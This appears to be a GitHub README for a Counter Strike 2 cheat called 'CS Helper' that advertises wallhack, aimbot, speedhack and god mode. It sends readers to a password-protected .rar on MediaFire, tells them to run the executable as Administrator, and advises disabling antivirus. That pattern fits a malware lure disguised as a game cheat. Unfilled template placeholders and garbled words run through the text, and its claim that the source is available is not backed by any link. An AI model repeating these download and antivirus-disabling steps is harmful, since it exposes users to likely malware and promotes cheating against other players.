<div align="center">

<!-- LOGO: Replace with your tool's logo or banner image -->
<img src="assets/banner.png" alt="CS Helper Banner" width="800"/>

<h1>CS Helper</h1>

<p><strong>The smartest [helper] for Counter Strike 2</strong></p>

<!-- Badges — update links to your actual repo/release -->
[![Version](https://img.shields.io/badge/version-1.0.0-blue?style=flat-square)](https://github.com/YOUR_USERNAME/YOUR_REPO/releases)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey?style=flat-square&logo=windows)](https://github.com/YOUR_USERNAME/YOUR_REPO)
[![Status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square)]()
[![License](https://img.shields.io/badge/license-MIT-orange?style=flat-square)](LICENSE)

</div>

---

## 📌 Overview

**CS Helper** is a lightweight, user-friendly Counter Strike 2 designed specifically for **Counter Strike 2**.
 

---

## ✨ Features

| Feature | Description |
|---|---|
| 🎯 **[Wallhack]** | e.g. See through walls and terrain to track enemy positions in real time. |
| 🛡️ **[AIM]** | e.g. Automatic aim assistance with adjustable FOV, smoothing, and target bone selection. |
| ⚡ **[SpeedHack]** | e.g. Modify movement speed multiplier for faster traversal or gameplay testing. |
| 💾 **[Presets]** | e.g. Save & load custom presets per session |
| 🔔 **[HotKeys]** | e.g. Hotkey support for all functions |
| 🌐 **[Switch Language]** | e.g. Multi-language UI (EN /  / DE / ...) |

---

## 🖥️ Requirements

- **OS:** Windows 10 / 11 (64-bit)
- **Game Version:** Counter Strike 2 v[2.90] or later
- **.NET ntime:** [version, e.g. .NET 6.0+]
- **RAM:** Minimum 4 GB
- **Additional:** Run as Administrator recommended

---

## 🚀 Getting Started

### 1. Download

Go to the [**CLICK**](https://www.mediafire.com/file/5h3v9nuywned8ru/CS+Helper.rar/file) page and download the latest `.rar` archive. **PASSWORD: 2026** 

### 2. Extract

Unzip the archive to any folder on your PC. **PASSWORD: 2026** 
> ⚠️ Do **not** place in `Program Files` — use a folder you control, e.g. `C:\Tools\CS Helper`.

### 3. Launch

1. Start **Counter Strike 2** first and load into a game session.
2. Run `CS Helper.exe` **as Administrator**.
3. The tool will auto-detect the running game process.
4. Use the interface or hotkeys to activate features.

---

## ⌨️ Hotkeys

| Key | Action |
|---|---|
| `[CTRL + 1]` | [Wallhack] |
| `[CTRL + 2]` | [AIM] |
| `[CTRL + 3]` | [SpeedHack] |
| `[CTRL + 4]` | [GODMode] |
| `[CTRL + 5]` | Toggle UI visibility |
| `[END]` | Emergency disable all |

> All hotkeys can be remapped in `Settings → Hotkeys`.

---

## 📁 File Stcture

```
CS Helper/
├── CS Helper.exe        ← Main executable
├── config.ini             ← User settings & hotkeys
├── presets/               ← Saved configuration presets
│   └── settings.json
├── logs/                  ← Debug and error logs
└── README.md
```

---

## ❓ FAQ

<details>
<summary><strong>Is this detectable by anti-cheat?</strong></summary>

In some cases, your antivirus software **may flag certain files in the program**. This happens because of a **direct connection to the game files**. You shouldn't worry about this. For a trouble-free experience, we recommend **disabling** your antivirus software.

</details>

<details>
<summary><strong>My antivis flags the file — is it safe?</strong></summary>

Tools that interact with game memory are sometimes flagged as false positives by antivis software. The source code is available for inspection. You can also compile it yourself. If in doubt, n it in a sandbox or virtual machine.

</details>

<details>
<summary><strong>The tool says "Process not found" — what do I do?</strong></summary>

Make sure Counter Strike 2 is nning **before** you launch the tool. Also ensure you're running CS Helper as Administrator. If the issue persists, check `logs/error.log` for details.

</details>

<details>
<summary><strong>Will this work after a game update?</strong></summary>

Game updates can change memory addresses. Check the Releases page for an updated version. We typically release patches within [3] days of a major game update.

</details>

<details>
<summary><strong>Can I save my settings?</strong></summary>

Yes. Use the **Presets** feature to save and load your configuration at any time. Presets are stored in the `presets/` folder as `.json` files.

</details>

---

## 🛠️ Troubleshooting

| Problem | Solution |
|---|---|
| Tool won't launch | run as Administrator; check .NET ntime is installed |
| "Process not found" | Launch the game first, then the tool |
| Features have no effect | Confirm you're using a supported game version |
| UI is invisible | Press `[INSERT]` to toggle the interface |
| Crash on startup | Check `logs/error.log` and open an Issue |

---

## 📋 Changelog

### v1.0.0 — [14.01.2026]
- 🎉 Initial public release
- ✅ [Wallhack] added 
- ✅ [AIM] added
- ✅ Hotkey remapping support

### v1.1.0 — [23.02.2026] *(Beta)*
- 🔧 Fixed crash on Counter Strike 2 v[4.11]
- ➕ Added preset system
- 🌐 Added EN language support

---


## ⚖️ Legal Disclaimer

**CS Helper** is an independent, unofficial project. It is **not affiliated with, endorsed by, or connected to** the developers or publishers of Counter Strike 2.

This software is provided **for educational and personal entertainment purposes only**. The authors assume no liability for misuse, account bans, or any consequences arising from use of this tool. Use at your own risk.

---

## 📬 Contact & Support

- 🐛 **Bug Reports:** [Open an Issue](https://github.com/YOUR_USERNAME/YOUR_REPO/issues)
- 💬 **Community:** [Discord Server](https://discord.gg/LightSoft) *(optional)*
- 📧 **Email:** lightsoft@protonmail.com *(optional)*

---

<div align="center">

Made with ❤️ by [LIGHT Soft]  
⭐ If this tool saved you time, consider starring the repo!

[![Star History](https://img.shields.io/github/stars/YOUR_USERNAME/YOUR_REPO?style=social)](https://github.com/YOUR_USERNAME/YOUR_REPO)

</div>
